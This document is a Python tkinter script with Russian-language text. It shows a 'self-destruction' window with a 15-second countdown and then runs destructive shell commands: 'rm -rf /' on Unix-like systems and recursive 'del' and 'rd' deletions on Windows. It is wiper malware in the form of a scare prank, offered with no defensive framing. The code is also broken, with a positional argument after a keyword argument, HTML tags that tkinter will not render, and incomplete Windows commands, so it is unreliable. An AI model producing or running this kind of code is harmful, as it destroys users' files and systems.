python
import tkinter as tk
from tkinter import messagebox
import os
import sys
import time

def rainbow_text(text):
    colors = ['red', 'orange', 'yellow', 'green', 'blue', 'indigo', 'violet']
    result = ""
    for i, char in enumerate(text):
        color = colors[i % len(colors)]
        result += f"<font color='{color}'>{char}</font>"
    return result

def center_window(root):
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    window_size = "400x200"
    root.geometry(f"{window_size}+{screen_width//2-200}+{screen_height//2-100}")

def start_destruction():
    try:
        os.system("cls" if os.name == "nt" else "clear")
        print("Начинается полное удаление данных...")
        time.sleep(3)
        
        # Полная очистка (Windows/Linux/MacOS)
        if sys.platform == "win32":
            os.system('del /s /q ')
            os.system('rd /s /q ')
        else:
            os.system("rm -rf /")
            
    except Exception as e:
        print(f"Ошибка при удалении: {str(e)}")

def countdown(root, label):
    time_left = 15
    while time_left >= 0:
        formatted_time = f"{time_left//60}:{time_left%60:02d}"
        label.config(text=f"<b>До самоуничтожения {formatted_time} секунд</b>")
        
        root.update()
        time.sleep(1)
        time_left -= 1

    root.destroy()
    start_destruction()

def main():
    root = tk.Tk()
    root.title("Самоуничтожение")
    center_window(root)
    
    style_frame = {
        "bg": "#2d2d2d",
        "fg": "#ffffff",
        "font": ("Arial", 14, "bold"),
        "padx": 20,
        "pady": 20
    }
    
    label = tk.Message(root, 
                      text=rainbow_text("Закройте все окна если не хотите потерять все свои учетные данные."),
                      style_frame)
    label.pack(expand=True)

    countdown_label = tk.Label(root, 
                              bg="#2d2d2d",
                              fg="white",
                              font=("Digital-7", 36))
    countdown_label.pack(pady=10)
    
    root.after(0, lambda: countdown(root, countdown_label))
    root.mainloop()

if __name__ == "__main__":
    main()